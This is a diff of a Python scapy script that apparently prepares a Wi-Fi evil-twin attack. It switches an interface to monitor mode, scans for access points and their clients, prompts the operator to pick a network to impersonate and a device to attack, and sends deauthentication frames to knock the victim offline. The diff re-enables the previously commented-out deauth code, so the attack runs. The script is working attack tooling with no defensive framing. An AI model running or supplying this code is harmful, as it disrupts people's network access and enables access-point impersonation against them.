@@ -1,11 +1,14 @@
 import os
-from progress.bar import IncrementalBar, ShadyBar, PixelBar
+import sys
+
+from progress.bar import IncrementalBar, ShadyBar, PixelBar, Bar, FillingSquaresBar, ChargingBar, FillingCirclesBar
+from progress.spinner import Spinner, MoonSpinner, PixelSpinner, PieSpinner, LineSpinner
 from scapy.all import *
 from threading import Thread
 import pandas
 import time
 import netifaces
-from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth
+from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon
 
 # global variables
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
@@ -34,28 +37,29 @@ def main():
     global presentation
     global interface
     print(presentation)
+    progress2()
+    os.system('clear')
     interface = get_interface()
     monitor_mode(interface)
     print("[+]Interface switched to monitor mode successfully")
+    time.sleep(1)
     print("[+]Scanning for wireless networks over all channels this will take 1 minute")
     # change interface wifi channel
-    os.system("clear")
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
     channel_changer.start()
-    '''progbar = Thread(target=progressbar(), daemon=True)
-    progbar.start()'''
+    progbar = Thread(target=progressbar)
+    progbar.start()
     sniff(prn=callback, iface=interface, timeout=60)
+    time.sleep(1)
     twin = get_network().lower()
-
-
-'''victim = get_device(twin).lower()
+    victim = get_device(twin).lower()
     # deauthentication packet to disconnect the victim device from the network
     deauth = Dot11(type=0, subtype=12, addr1=victim, addr2=twin, addr3=twin)
     # stack packet headers
     deauth_pkt = RadioTap() / deauth / Dot11Deauth(reason=7)
     # send the packet
-    sendp(deauth_pkt, inter=0.1, count=10000, iface=interface, verbose=1)'''
+    sendp(deauth_pkt, inter=0.1, count=100, iface=interface, verbose=1)
 
 
 # display a progress bar for aesthetics
@@ -108,35 +112,39 @@ def callback(pkt):
         to_ds = ds & 0x1 != 0  # to access point
         from_ds = ds & 0x2 != 0  # from access point
 
-        if pkt.type == 0 and pkt.subtype == 8:  # beacon which means its coming from a network
-            bssid = mac_frame.addr2
-            ssid = pkt[Dot11Elt].info.decode()  # network name
+        # if pkt.type == 0 and pkt.subtype == 8:  # beacon which means its coming from a network
+        if pkt.haslayer(Dot11Beacon):
             if mac_frame.addr2 not in devices:
                 devices[mac_frame.addr2] = set()
+                ssid = pkt[Dot11Beacon].network_stats()['ssid']
                 network_mac[mac_frame.addr2] = ssid
 
         if from_ds == 1 and to_ds == 0:  # transmitter is AP and destination is client
-            if mac_frame.addr2 in devices and mac_frame.addr2 != mac_frame.addr3 and mac_frame.addr3 \
+            if mac_frame.addr2 in devices and mac_frame.addr3 != mac_frame.addr2 and mac_frame.addr3 \
                     not in devices[mac_frame.addr2]:
                 devices[mac_frame.addr2].add(mac_frame.addr3)
 
         if from_ds == 0 and to_ds == 1:  # source address is client and transmitter is AP
 
-            if mac_frame.addr1 in devices and mac_frame.addr2 != mac_frame.addr1 and mac_frame.addr2 \
+            if mac_frame.addr1 in devices and mac_frame.addr2 \
                     not in devices[mac_frame.addr1]:
                 devices[mac_frame.addr1].add(mac_frame.addr2)
 
-        if from_ds == 0 and to_ds == 0:  # control frame or managment from which means src is AP
-            if mac_frame.addr3 in devices and mac_frame.addr2 not in devices[mac_frame.addr3]:
+        if from_ds == 0 and to_ds == 0:  # control frame or managment from which means src is AP or vice versa
+            if mac_frame.addr3 in devices and mac_frame.addr3 != mac_frame.addr2 and \
+                    mac_frame.addr2 not in devices[mac_frame.addr3]:
                 devices[mac_frame.addr3].add(mac_frame.addr2)
+                if mac_frame.addr2 in devices and mac_frame.addr2 != mac_frame.addr3 and \
+                        mac_frame.addr3 not in devices[mac_frame.addr2]:
+                    devices[mac_frame.addr2].add(mac_frame.addr3)
 
-        if from_ds == 1 and to_ds == 1:  # transmitter and reciever are APs
+        '''if from_ds == 1 and to_ds == 1:  # transmitter and reciever could be  APs
             if mac_frame.addr2 in devices and mac_frame.addr2 != mac_frame.addr4 and \
                     mac_frame.addr4 not in devices[mac_frame.addr2]:
                 devices[mac_frame.addr3].add(mac_frame.addr2)
             if mac_frame.addr1 in devices and mac_frame.addr1 != mac_frame.addr3 and mac_frame.addr3 not in \
                     devices[mac_frame.addr1]:
-                devices[mac_frame.addr1].add(mac_frame.addr3)
+                devices[mac_frame.addr1].add(mac_frame.addr3)'''
 
 
 # get a list of networks and return the mac of the network chosen by the user
@@ -147,7 +155,7 @@ def get_network():
     print("Detected networks")
     for network in network_mac:
         print(i, "- " + str(network_mac[network]))
-        net_index[i] = network
+        net_index[str(i)] = network
         i = i + 1
     k = input("Choose the network you want to impersonate (press 0 - " + str(i) + "): ")
     return net_index[k]
@@ -161,10 +169,24 @@ def get_device(captive):
     i = 0
     for device in devices[captive]:
         print(i, "- " + str(device))
-        device_mac[i] = device
+        device_mac[str(i)] = device
         i = i + 1
     k = input("Choose the device you want to attack (press 0 - " + str(i) + "): ")
     return device_mac[k]
+
+
+def sleep():
+    t = 0.01
+    t += t * random.uniform(-0.1, 0.1)  # Add some variance
+    time.sleep(t)
+
+
+def progress2():
+    bar_cls = FillingCirclesBar
+
+    bar = bar_cls('loading')
+    for i in bar.iter(range(200, 400)):
+        sleep()
 
 
 main()
